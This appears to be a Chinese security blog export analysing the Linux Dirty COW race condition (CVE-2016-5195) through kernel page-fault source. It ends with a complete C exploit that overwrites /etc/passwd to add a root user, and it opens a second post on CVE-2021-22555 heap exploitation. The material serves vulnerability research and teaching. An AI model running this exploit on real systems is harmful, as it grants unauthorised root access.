mm_struct *mm,\t\t     struct vm_area_struct *vma, unsigned long address,\t\t     pte_t *pte, pmd_t *pmd, unsigned int flags)&#123;\tpte_t entry;\tspinlock_t *ptl;\t/*\t * some architectures can have larger ptes than wordsize,\t * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,\t * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.\t * The code below just needs a consistent view for the ifs and\t * we later double check anyway with the ptl lock held. So here\t * a barrier will do.\t */\tentry = *pte;\tbarrier();\tif (!pte_present(entry)) &#123;\t\tif (pte_none(entry)) &#123;\t\t\tif (vma_is_anonymous(vma))\t\t\t\treturn do_anonymous_page(mm, vma, address,\t\t\t\t\t\t\t pte, pmd, flags);\t\t\telse\t\t\t\treturn do_fault(mm, vma, address, pte, pmd,\t\t\t\t\t\tflags, entry);\t\t&#125;\t\treturn do_swap_page(mm, vma, address,\t\t\t\t\tpte, pmd, flags, entry);\t&#125;\tif (pte_protnone(entry))\t\treturn do_numa_page(mm, vma, address, entry, pte, pmd);\tptl = pte_lockptr(mm, pmd);\tspin_lock(ptl);\tif (unlikely(!pte_same(*pte, entry)))\t\tgoto unlock;\tif (flags &amp; FAULT_FLAG_WRITE) &#123;\t\tif (!pte_write(entry))\t\t\treturn do_wp_page(mm, vma, address,\t\t\t\t\tpte, pmd, ptl, entry);\t\tentry = pte_mkdirty(entry);\t&#125;\tentry = pte_mkyoung(entry);\tif (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;\t\tupdate_mmu_cache(vma, address, pte);\t&#125; else &#123;\t\t/*\t\t * This is needed only for protection faults but the arch code\t\t * is not yet telling us if this is a protection fault or not.\t\t * This still avoids useless tlb flushes for .text page faults\t\t * with threads.\t\t */\t\tif (flags &amp; FAULT_FLAG_WRITE)\t\t\tflush_tlb_fix_spurious_fault(vma, address);\t&#125;unlock:\tpte_unmap_unlock(pte, ptl);\treturn 0;&#125;\n\n函数开头初始化entry为pte的内存页然后我们继续逐行分析。\nif (!pte_present(entry)) &#123;  if (pte_none(entry)) &#123;    if (vma_is_anonymous(vma))      return do_anonymous_page(mm, vma, address,                               pte, pmd, flags);    else      return do_fault(mm, vma, address, pte, pmd,                      flags, entry);  &#125;  return do_swap_page(mm, vma, address,                      pte, pmd, flags, entry);&#125;\n\n首先判断页表是否存在于主存中，接着判断是否为none，如果为空则表示第一次访问该页，那么继续进入判断vma是否为匿名区，如果不是则执行do_fault返回物理页。如果该页不为空，软性缺页异常中的第二种情况，代表该页以前存在于主存中但是被调出了。\n程序继续往后执行，下方代表的是内存页存在于主存中时的情况。\n首先则是先加了一层锁spin_lock(ptl);\nif (flags &amp; FAULT_FLAG_WRITE) &#123;  if (!pte_write(entry))    return do_wp_page(mm, vma, address,                      pte, pmd, ptl, entry);  entry = pte_mkdirty(entry);&#125;entry = pte_mkyoung(entry);\n\n首先通过flags判断是否是应为写操作引起的缺页异常，紧接着看对应的页是否可写，如果不可写则进入do_wp_page函数中。后续就是将该页标脏和标上已经访问过。\n经过上述流程不难发现当一个进程首次访问一个不可写的内存页时会触发两次缺页异常，一次是页不存在于主存中的情况，第二次是下面存在于主存的情况。\n那么首先我们先看第一次进入的情况，此时处理的函数为do_fault。\nstatic int do_fault(struct mm_struct *mm, struct vm_area_struct *vma,\t\tunsigned long address, pte_t *page_table, pmd_t *pmd,\t\tunsigned int flags, pte_t orig_pte)&#123;\tpgoff_t pgoff = (((address &amp; PAGE_MASK)\t\t\t- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;\tpte_unmap(page_table);\t/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */\tif (!vma-&gt;vm_ops-&gt;fault)\t\treturn VM_FAULT_SIGBUS;\tif (!(flags &amp; FAULT_FLAG_WRITE))\t\treturn do_read_fault(mm, vma, address, pmd, pgoff, flags,\t\t\t\torig_pte);\tif (!(vma-&gt;vm_flags &amp; VM_SHARED))\t\treturn do_cow_fault(mm, vma, address, pmd, pgoff, flags,\t\t\t\torig_pte);\treturn do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);&#125;\n\n主要就是下面判断，如果是非写的操作引起的异常则进入do_read_fault函数，如果是非共享内存引起的异常则进入do_cow_fault，如果是因为共享内存引起的异常则进入do_shared_fault函数中去。\nstatic int do_cow_fault(struct mm_struct *mm, struct vm_area_struct *vma,\t\tunsigned long address, pmd_t *pmd,\t\tpgoff_t pgoff, unsigned int flags, pte_t orig_pte)&#123;\tstruct page *fault_page, *new_page;\tstruct mem_cgroup *memcg;\tspinlock_t *ptl;\tpte_t *pte;\tint ret;\tif (unlikely(anon_vma_prepare(vma)))\t\treturn VM_FAULT_OOM;\tnew_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);\tif (!new_page)\t\treturn VM_FAULT_OOM;\tif (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;\t\tpage_cache_release(new_page);\t\treturn VM_FAULT_OOM;\t&#125;\tret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);\tif (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))\t\tgoto uncharge_out;\tif (fault_page)\t\tcopy_user_highpage(new_page, fault_page, address, vma);\t__SetPageUptodate(new_page);\tpte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);\tif (unlikely(!pte_same(*pte, orig_pte))) &#123;\t\tpte_unmap_unlock(pte, ptl);\t\tif (fault_page) &#123;\t\t\tunlock_page(fault_page);\t\t\tpage_cache_release(fault_page);\t\t&#125; else &#123;\t\t\t/*\t\t\t * The fault handler has no page to lock, so it holds\t\t\t * i_mmap_lock for read to protect against truncate.\t\t\t */\t\t\ti_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);\t\t&#125;\t\tgoto uncharge_out;\t&#125;\tdo_set_pte(vma, address, new_page, pte, true, true);\tmem_cgroup_commit_charge(new_page, memcg, false);\tlru_cache_add_active_or_unevictable(new_page, vma);\tpte_unmap_unlock(pte, ptl);\tif (fault_page) &#123;\t\tunlock_page(fault_page);\t\tpage_cache_release(fault_page);\t&#125; else &#123;\t\t/*\t\t * The fault handler has no page to lock, so it holds\t\t * i_mmap_lock for read to protect against truncate.\t\t */\t\ti_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);\t&#125;\treturn ret;uncharge_out:\tmem_cgroup_cancel_charge(new_page, memcg);\tpage_cache_release(new_page);\treturn ret;&#125;\n\n根据名字可以看出来这个函数是我们比较关注的函数，new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);首先则就是创建一个物理页。ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);这里读取文件的内容到fault_page中去。\nif (fault_page)  copy_user_highpage(new_page, fault_page, address, vma);\n\n随后在这里将fault_page中的内容拷贝到new_page中去。\nif (unlikely(!pte_same(*pte, orig_pte))) 这里验证pte和orig_ptr是否一致，如果不一致则表示pte中途被修改过那么直接释放两个内存页之后退出。\ndo_set_pte(vma, address, new_page, pte, true, true);在这里设置pte中的标志位并且标上dirty标志位，不过因为会检测文件是否为可写如果不是则不会标记上write，最后释放fault_page结束函数。\n在进行完第一步之后如果页面不可写的话就会进入到第二步中\nstatic int do_wp_page(struct mm_struct *mm, struct vm_area_struct *vma,\t\tunsigned long address, pte_t *page_table, pmd_t *pmd,\t\tspinlock_t *ptl, pte_t orig_pte)\t__releases(ptl)&#123;\tstruct page *old_page;\told_page = vm_normal_page(vma, address, orig_pte);\tif (!old_page) &#123;\t\t/*\t\t * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a\t\t * VM_PFNMAP VMA.\t\t *\t\t * We should not cow pages in a shared writeable mapping.\t\t * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.\t\t */\t\tif ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==\t\t\t\t     (VM_WRITE|VM_SHARED))\t\t\treturn wp_pfn_shared(mm, vma, address, page_table, ptl,\t\t\t\t\t     orig_pte, pmd);\t\tpte_unmap_unlock(page_table, ptl);\t\treturn wp_page_copy(mm, vma, address, page_table, pmd,\t\t\t\t    orig_pte, old_page);\t&#125;\t/*\t * Take out anonymous pages first, anonymous shared vmas are\t * not dirty accountable.\t */\tif (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;\t\tif (!trylock_page(old_page)) &#123;\t\t\tpage_cache_get(old_page);\t\t\tpte_unmap_unlock(page_table, ptl);\t\t\tlock_page(old_page);\t\t\tpage_table = pte_offset_map_lock(mm, pmd, address,\t\t\t\t\t\t\t &amp;ptl);\t\t\tif (!pte_same(*page_table, orig_pte)) &#123;\t\t\t\tunlock_page(old_page);\t\t\t\tpte_unmap_unlock(page_table, ptl);\t\t\t\tpage_cache_release(old_page);\t\t\t\treturn 0;\t\t\t&#125;\t\t\tpage_cache_release(old_page);\t\t&#125;\t\tif (reuse_swap_page(old_page)) &#123;\t\t\t/*\t\t\t * The page is all ours.  Move it to our anon_vma so\t\t\t * the rmap code will not search our parent or siblings.\t\t\t * Protected against the rmap code by the page lock.\t\t\t */\t\t\tpage_move_anon_rmap(old_page, vma, address);\t\t\tunlock_page(old_page);\t\t\treturn wp_page_reuse(mm, vma, address, page_table, ptl,\t\t\t\t\t     orig_pte, old_page, 0, 0);\t\t&#125;\t\tunlock_page(old_page);\t&#125; else if (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==\t\t\t\t\t(VM_WRITE|VM_SHARED))) &#123;\t\treturn wp_page_shared(mm, vma, address, page_table, pmd,\t\t\t\t      ptl, orig_pte, old_page);\t&#125;\t/*\t * Ok, we need to copy. Oh, well..\t */\tpage_cache_get(old_page);\tpte_unmap_unlock(page_table, ptl);\treturn wp_page_copy(mm, vma, address, page_table, pmd,\t\t\t    orig_pte, old_page);&#125;\n\n首先通过old_page = vm_normal_page(vma, address, orig_pte);获取缺页的线性地址对应的struct page结构，对于一些特殊映射的页面（如页面回收、页迁移和KSM等），内核并不希望这些页参与到内存管理的一些流程当中，称之为special mapping，并无对应的struct page结构体。\n紧接着判断是否为special mapping，如果是则会进入if分支，当然我们这里不是。\n随后判断页面是否为匿名页并且不为KSM，如果成立并且可以成功上锁则进入以下语句。\nif (reuse_swap_page(old_page)) &#123;  page_move_anon_rmap(old_page, vma, address);  unlock_page(old_page);  return wp_page_reuse(mm, vma, address, page_table, ptl,                       orig_pte, old_page, 0, 0);&#125;\n\n其中首先通过reuse_swap_page判断是否只有一个进程在使用该页，如果是则直接调用wp_page_reuse函数重用该页。如果以上的所有都没满足则进入最后的无法重用进行写时复制。\n那么以上就是COW的全部流程了，接下来分析一下write函数。\nwrite函数分析具体流程其实就是：\nsys_write() =&gt; vfs_write() =&gt; __vfs_write() =&gt; file-&gt;f_op-&gt;write() =&gt; mem_write() =&gt; mem_rw()\n\nmem_rwstatic ssize_t mem_rw(struct file *file, char __user *buf,\t\t\tsize_t count, loff_t *ppos, int write)&#123;\tstruct mm_struct *mm = file-&gt;private_data;\tunsigned long addr = *ppos;\tssize_t copied;\tchar *page;\tif (!mm)\t\treturn 0;\tpage = (char *)__get_free_page(GFP_TEMPORARY);\tif (!page)\t\treturn -ENOMEM;\tcopied = 0;\tif (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))\t\tgoto free;\twhile (count &gt; 0) &#123;\t\tint this_len = min_t(int, count, PAGE_SIZE);\t\tif (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;\t\t\tcopied = -EFAULT;\t\t\tbreak;\t\t&#125;\t\tthis_len = access_remote_vm(mm, addr, page, this_len, write);\t\tif (!this_len) &#123;\t\t\tif (!copied)\t\t\t\tcopied = -EIO;\t\t\tbreak;\t\t&#125;\t\tif (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;\t\t\tcopied = -EFAULT;\t\t\tbreak;\t\t&#125;\t\tbuf += this_len;\t\taddr += this_len;\t\tcopied += this_len;\t\tcount -= this_len;\t&#125;\t*ppos = addr;\tmmput(mm);free:\tfree_page((unsigned long) page);\treturn copied;&#125;\n\n这里的流程还是听清晰的，首先就是获取一个临时的内存页，紧接着将用户空间的内容放到临时的内存页中即可，接着利用access_remote_vm函数访问内存，然后后面是如果不是写的话就返回内容到用户空间，最后释放临时内存页。\naccess_remote_vmaccess_remote_vm函数其实就是__access_remote_vm。\nstatic int __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,\t\tunsigned long addr, void *buf, int len, int write)&#123;\tstruct vm_area_struct *vma;\tvoid *old_buf = buf;\tdown_read(&amp;mm-&gt;mmap_sem);\t/* ignore errors, just check how much was successfully transferred */\twhile (len) &#123;\t\tint bytes, ret, offset;\t\tvoid *maddr;\t\tstruct page *page = NULL;\t\tret = get_user_pages(tsk, mm, addr, 1,\t\t\t\twrite, 1, &amp;page, &amp;vma);\t\tif (ret &lt;= 0) &#123;#ifndef CONFIG_HAVE_IOREMAP_PROT\t\t\tbreak;#else\t\t\t/*\t\t\t * Check if this is a VM_IO | VM_PFNMAP VMA, which\t\t\t * we can access using slightly different code.\t\t\t */\t\t\tvma = find_vma(mm, addr);\t\t\tif (!vma || vma-&gt;vm_start &gt; addr)\t\t\t\tbreak;\t\t\tif (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)\t\t\t\tret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,\t\t\t\t\t\t\t  len, write);\t\t\tif (ret &lt;= 0)\t\t\t\tbreak;\t\t\tbytes = ret;#endif\t\t&#125; else &#123;\t\t\tbytes = len;\t\t\toffset = addr &amp; (PAGE_SIZE-1);\t\t\tif (bytes &gt; PAGE_SIZE-offset)\t\t\t\tbytes = PAGE_SIZE-offset;\t\t\tmaddr = kmap(page);\t\t\tif (write) &#123;\t\t\t\tcopy_to_user_page(vma, page, addr,\t\t\t\t\t\t  maddr + offset, buf, bytes);\t\t\t\tset_page_dirty_lock(page);\t\t\t&#125; else &#123;\t\t\t\tcopy_from_user_page(vma, page, addr,\t\t\t\t\t\t    buf, maddr + offset, bytes);\t\t\t&#125;\t\t\tkunmap(page);\t\t\tpage_cache_release(page);\t\t&#125;\t\tlen -= bytes;\t\tbuf += bytes;\t\taddr += bytes;\t&#125;\tup_read(&amp;mm-&gt;mmap_sem);\treturn buf - old_buf;&#125;\n\n这里通过ret = get_user_pages(tsk, mm, addr, 1, write, 1, &amp;page, &amp;vma);获取到对应目标的内存页。然后通过maddr = kmap(page);建立映射，最后在copy_to_user_page(vma, page, addr, maddr + offset, buf, bytes);中写入。\n那么其中最为重要的即为get_user_pages函数\n__get_user_pageslong __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,\t\tunsigned long start, unsigned long nr_pages,\t\tunsigned int gup_flags, struct page **pages,\t\tstruct vm_area_struct **vmas, int *nonblocking)&#123;\tlong i = 0;\tunsigned int page_mask;\tstruct vm_area_struct *vma = NULL;\tif (!nr_pages)\t\treturn 0;\tVM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));\t/*\t * If FOLL_FORCE is set then do not force a full fault as the hinting\t * fault information is unrelated to the reference behaviour of a task\t * using the address space\t */\tif (!(gup_flags &amp; FOLL_FORCE))\t\tgup_flags |= FOLL_NUMA;\tdo &#123;\t\tstruct page *page;\t\tunsigned int foll_flags = gup_flags;\t\tunsigned int page_increm;\t\t/* first iteration or cross vma bound */\t\tif (!vma || start &gt;= vma-&gt;vm_end) &#123;\t\t\tvma = find_extend_vma(mm, start);\t\t\tif (!vma &amp;&amp; in_gate_area(mm, start)) &#123;\t\t\t\tint ret;\t\t\t\tret = get_gate_page(mm, start &amp; PAGE_MASK,\t\t\t\t\t\tgup_flags, &amp;vma,\t\t\t\t\t\tpages ? &amp;pages[i] : NULL);\t\t\t\tif (ret)\t\t\t\t\treturn i ? : ret;\t\t\t\tpage_mask = 0;\t\t\t\tgoto next_page;\t\t\t&#125;\t\t\tif (!vma || check_vma_flags(vma, gup_flags))\t\t\t\treturn i ? : -EFAULT;\t\t\tif (is_vm_hugetlb_page(vma)) &#123;\t\t\t\ti = follow_hugetlb_page(mm, vma, pages, vmas,\t\t\t\t\t\t&amp;start, &amp;nr_pages, i,\t\t\t\t\t\tgup_flags);\t\t\t\tcontinue;\t\t\t&#125;\t\t&#125;retry:\t\t/*\t\t * If we have a pending SIGKILL, don&#x27;t keep faulting pages and\t\t * potentially allocating memory.\t\t */\t\tif (unlikely(fatal_signal_pending(current)))\t\t\treturn i ? i : -ERESTARTSYS;\t\tcond_resched();      page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);\t\tif (!page) &#123;\t\t\tint ret;\t\t\tret = faultin_page(tsk, vma, start, &amp;foll_flags,\t\t\t\t\tnonblocking);\t\t\tswitch (ret) &#123;\t\t\tcase 0:\t\t\t\tgoto retry;\t\t\tcase -EFAULT:\t\t\tcase -ENOMEM:\t\t\tcase -EHWPOISON:\t\t\t\treturn i ? i : ret;\t\t\tcase -EBUSY:\t\t\t\treturn i;\t\t\tcase -ENOENT:\t\t\t\tgoto next_page;\t\t\t&#125;\t\t\tBUG();\t\t&#125; else if (PTR_ERR(page) == -EEXIST) &#123;\t\t\t/*\t\t\t * Proper page table entry exists, but no corresponding\t\t\t * struct page.\t\t\t */\t\t\tgoto next_page;\t\t&#125; else if (IS_ERR(page)) &#123;\t\t\treturn i ? i : PTR_ERR(page);\t\t&#125;\t\tif (pages) &#123;\t\t\tpages[i] = page;\t\t\tflush_anon_page(vma, page, start);\t\t\tflush_dcache_page(page);\t\t\tpage_mask = 0;\t\t&#125;next_page:\t\tif (vmas) &#123;\t\t\tvmas[i] = vma;\t\t\tpage_mask = 0;\t\t&#125;\t\tpage_increm = 1 + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);\t\tif (page_increm &gt; nr_pages)\t\t\tpage_increm = nr_pages;\t\ti += page_increm;\t\tstart += page_increm * PAGE_SIZE;\t\tnr_pages -= page_increm;\t&#125; while (nr_pages);\treturn i;&#125;EXPORT_SYMBOL(__get_user_pages);\n\n最开始就是对vma的一些操作，我们需要注意的是retry之后的内容。可以看出来的是follow_page_mask函数返回的是物理页面，而且faultin_page函数中会调用handle_mm_fault。\n那么我们在第一次往一个文件中写入内容时会因为Linux的延迟绑定机制导致该页还未和对应的物理页建立映射，那么此时follow_page_mask函数返回的则是NULL，随即进入第一个faultin_page函数，根据前面的分析，这一次解决完毕之后，会分配物理页。那么这里经过retry再一次执行follow_page_mask，不过因为页面不可写再一次导致返回的值为NULL，随即进行第二次faultin_page函数，进行写时复制。\nstatic int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,\t\tunsigned long address, unsigned int *flags, int *nonblocking)&#123;\tstruct mm_struct *mm = vma-&gt;vm_mm;\tunsigned int fault_flags = 0;\tint ret;\t/* mlock all present pages, but do not fault in new pages */\tif ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)\t\treturn -ENOENT;\t/* For mm_populate(), just skip the stack guard page. */\tif ((*flags &amp; FOLL_POPULATE) &amp;&amp;\t\t\t(stack_guard_page_start(vma, address) ||\t\t\t stack_guard_page_end(vma, address + PAGE_SIZE)))\t\treturn -ENOENT;\tif (*flags &amp; FOLL_WRITE)\t\tfault_flags |= FAULT_FLAG_WRITE;\tif (nonblocking)\t\tfault_flags |= FAULT_FLAG_ALLOW_RETRY;\tif (*flags &amp; FOLL_NOWAIT)\t\tfault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;\tif (*flags &amp; FOLL_TRIED) &#123;\t\tVM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);\t\tfault_flags |= FAULT_FLAG_TRIED;\t&#125;\tret = handle_mm_fault(mm, vma, address, fault_flags);\tif (ret &amp; VM_FAULT_ERROR) &#123;\t\tif (ret &amp; VM_FAULT_OOM)\t\t\treturn -ENOMEM;\t\tif (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))\t\t\treturn *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;\t\tif (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))\t\t\treturn -EFAULT;\t\tBUG();\t&#125;\tif (tsk) &#123;\t\tif (ret &amp; VM_FAULT_MAJOR)\t\t\ttsk-&gt;maj_flt++;\t\telse\t\t\ttsk-&gt;min_flt++;\t&#125;\tif (ret &amp; VM_FAULT_RETRY) &#123;\t\tif (nonblocking)\t\t\t*nonblocking = 0;\t\treturn -EBUSY;\t&#125;\t/*\t * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when\t * necessary, even if maybe_mkwrite decided not to set pte_write. We\t * can thus safely do subsequent page lookups as if they were reads.\t * But only do so when looping for pte_write is futile: in some cases\t * userspace may also be wanting to write to the gotten user page,\t * which a read fault here might prevent (a readonly page might get\t * reCOWed by userspace write).\t */\tif ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))\t\t*flags &amp;= ~FOLL_WRITE;\treturn 0;&#125;\n\n第二次进入时，返回的是一个可写的内存页了，并且返回值为VM_FAULT_WRITE，所以会执行到上面的最后一段，所以会清除掉flag中的FOLL_WRITE。那么在下一次调用follow_page_pte函数时则会返回正常的内存页了。\n漏洞分析在分析之前，首先看一下madvise系统调用，madvise一共有三个参数，第一个参数为地址，第二参数为范围，第三个参数为行为。而这个函数的作用就是建议内核，在从 addr 指定的地址开始，长度等于 len 参数值的范围内，该区域的用户虚拟内存应遵循特定的使用模式。内核使用这些信息优化与指定范围关联的资源的处理和维护过程。而其中存在一个MADV_DONTNEED参数我所理解的就是去除对应的表项，并且被内核标记，在被需要时可以被重新使用。\n漏洞成因static int do_fault(struct mm_struct *mm, struct vm_area_struct *vma,\t\tunsigned long address, pte_t *page_table, pmd_t *pmd,\t\tunsigned int flags, pte_t orig_pte)&#123;\tpgoff_t pgoff = (((address &amp; PAGE_MASK)\t\t\t- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;\tpte_unmap(page_table);\t/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */\tif (!vma-&gt;vm_ops-&gt;fault)\t\treturn VM_FAULT_SIGBUS;\tif (!(flags &amp; FAULT_FLAG_WRITE))\t\treturn do_read_fault(mm, vma, address, pmd, pgoff, flags,\t\t\t\torig_pte);\tif (!(vma-&gt;vm_flags &amp; VM_SHARED))\t\treturn do_cow_fault(mm, vma, address, pmd, pgoff, flags,\t\t\t\torig_pte);\treturn do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);&#125;\n\n再次聚焦do_fault函数，可以看到这一次我们的flags其实是没有FAULT_FLAG_WRITE标志位的，所以会直接调用do_read_fault。\nstatic int do_read_fault(struct mm_struct *mm, struct vm_area_struct *vma,\t\tunsigned long address, pmd_t *pmd,\t\tpgoff_t pgoff, unsigned int flags, pte_t orig_pte)&#123;\tstruct page *fault_page;\tspinlock_t *ptl;\tpte_t *pte;\tint ret = 0;\t/*\t * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback\t * if page by the offset is not ready to be mapped (cold cache or\t * something).\t */\tif (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; 1) &#123;\t\tpte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);\t\tdo_fault_around(vma, address, pte, pgoff, flags);\t\tif (!pte_same(*pte, orig_pte))\t\t\tgoto unlock_out;\t\tpte_unmap_unlock(pte, ptl);\t&#125;\tret = __do_fault(vma, address, pgoff, flags, NULL, &amp;fault_page);\tif (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))\t\treturn ret;\tpte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);\tif (unlikely(!pte_same(*pte, orig_pte))) &#123;\t\tpte_unmap_unlock(pte, ptl);\t\tunlock_page(fault_page);\t\tpage_cache_release(fault_page);\t\treturn ret;\t&#125;\tdo_set_pte(vma, address, fault_page, pte, false, false);\tunlock_page(fault_page);unlock_out:\tpte_unmap_unlock(pte, ptl);\treturn ret;&#125;\n\n注意do_set_pte(vma, address, fault_page, pte, false, false);函数调用，在do_cow_fault函数中同样存在这样的调用do_set_pte(vma, address, new_page, pte, true, true);。可以发现第三个参数也就决定了后面可以获取到的页面，而do_read_fault这里获取的直接就是fault_page，这里就是很简单粗暴的将其移出page_cache，这是因为kernel在面对一个读请求时不会大费周章的再去创建一个dirty COW页。\n利用分析使用两个线程跑竞争，在第一个线程完成两次缺页异常的流程之后，第二个线程调用madvise()系统调用将内存页调出，那么第一个线程在尝试第三次获取内存页时便无法正常获取到可读的物理页，此时会再次出发缺页异常，接下来会有一次进入到faultin_page()函数中，而这次返回的内存页其实就是fault_page，并且这个内存页也是不可写状态的，但是在上面的flag中，我们已经去除掉了FOLL_WRITE所以在内核眼中，这是一块用来读的内存页，所以会正常返回处内存页，但是在access_remote_vm中判断读写使用的是write变量，所以实际上我们依旧是在往内部进行写，至此成功实现了越权写。\n综上，可得exp#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;crypt.h&gt;struct stat passwd_st;void *map;char *fake_user;int fake_user_length;pthread_t write_thread, madvise_thread;struct Userinfo&#123;    char *username;    char *hash;    int user_id;    int group_id;    char *info;    char *home_dir;    char *shell;&#125;;struct Userinfo info =    &#123;        .user_id = 0,        .group_id = 0,        .info = &quot;196082&quot;,        .home_dir = &quot;/root&quot;,        .shell = &quot;/bin/sh&quot;,&#125;;void *writeThread(void *argv)&#123;    int mm_fd = open(&quot;/proc/self/mem&quot;, O_RDWR);    printf(&quot;fd of mem: %d\\n&quot;, mm_fd);    for (int i = 0; i &lt; 0x10000; i++)    &#123;        lseek(mm_fd, (off_t)map, SEEK_SET);        write(mm_fd, fake_user, fake_user_length);    &#125;    return NULL;&#125;void *madviseThread(void *argv)&#123;    for (int i = 0; i &lt; 0x10000; i++)    &#123;        madvise(map, 0x100, MADV_DONTNEED);    &#125;    return NULL;&#125;int main(int argc, char **argv)&#123;    int passwd_fd;    if (argc &lt; 3)    &#123;        puts(&quot;usage: ./dirty username password&quot;);        puts(&quot;do not forget to make a backup for the /etc/passwd by yourself&quot;);        return 0;    &#125;    info.username = argv[1];    info.hash = crypt(argv[2], argv[1]);    fake_user_length = snprintf(NULL, 0, &quot;%s:%s:%d:%d:%s:%s:%s\\n&quot;,                                info.username,                                info.hash,                                info.user_id,                                info.group_id,                                info.info,                                info.home_dir,                                info.shell);    fake_user = (char *)malloc(fake_user_length + 0x10);    sprintf(fake_user, &quot;%s:%s:%d:%d:%s:%s:%s\\n&quot;,            info.username,            info.hash,            info.user_id,            info.group_id,            info.info,            info.home_dir,            info.shell);    passwd_fd = open(&quot;/etc/passwd&quot;, O_RDONLY);    printf(&quot;fd of /etc/passwd: %d\\n&quot;, passwd_fd);    fstat(passwd_fd, &amp;passwd_st);    map = mmap(NULL, passwd_st.st_size, PROT_READ, MAP_PRIVATE, passwd_fd, 0);    pthread_create(&amp;madvise_thread, NULL, madviseThread, NULL);    pthread_create(&amp;write_thread, NULL, writeThread, NULL);    pthread_join(madvise_thread, NULL);    pthread_join(write_thread, NULL);    return 0;&#125;\n\n\n参考链接：\n​    https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/\n​    https://elixir.bootlin.com/linux/v4.4/source\n","categories":["Linux Kernel","CVE复现"],"tags":["page fault","COW","Race condition"]},{"title":"CVE-2021-22555利用方法分析","url":"/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/","content":"前言在上一篇文章d3kheap中提到还有另外一种解决办法就是利用这一CVE进行利用，所以这一篇依旧使用d3kheap来进行复现。不过这里首先提一下这个CVE原本的漏洞。\n在原本的CVE中漏洞点是net/netfilter/x_tables.c 中 Netfilter 模块的ip_tables子模块， 当调用setsockopt()和选项IPT_SO_SET_REPLACE（或 IP6T_SO_SET_REPLACE）时，内核结构需要从32位转换为64位，由于错误计算转换大小，导致在调用 xt_compat_match_from_user() 函数时堆溢出写 0。\n这里利用这一漏洞的方法是，首先我们需要在msg_queue中存放两个msg_msg，分为一个主消息(0x1000)和一个辅助消息(0x400)。利用两个字节的溢出覆盖掉其中某一个主消息msg_msg-&gt;m_list-&gt;next指针，使两个msg_msg主消息指向同一个辅助消息，进而转化为UAF漏洞。后续的利用会在d3kheap题目提到这里就不再赘述了。\n利用分析因为我们这里相较于原本的CVE中可以更为简单的形成uaf，所以我们只需要考虑如何使用结构体即可。我们顺理成章的选择与原CVE相同的msg_msg建立主从消息队列\n\n为了方便后续的利用我们主从消息堆块的size分别选择96和1024。\n此时我们可以利用d3kheap的功能造成UAF，但是我们仍然可以通过其中一个消息队列访问这个已经进入freelist的msg_msg，所以现在我们需要定位这一个msg_queue\n定位msg_queue\n这里是目前内存中主从形式，这里我们使用sk_buff堆喷来定位这个free了的msg_msg结构体，该结构体类似于 msg_msg，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 msg_msg 由一个 header 加上用户数据组成，而 sk_buff 本身不包含任何用户数据，用户数据单独存放在一个 object 当中，而 sk_buff 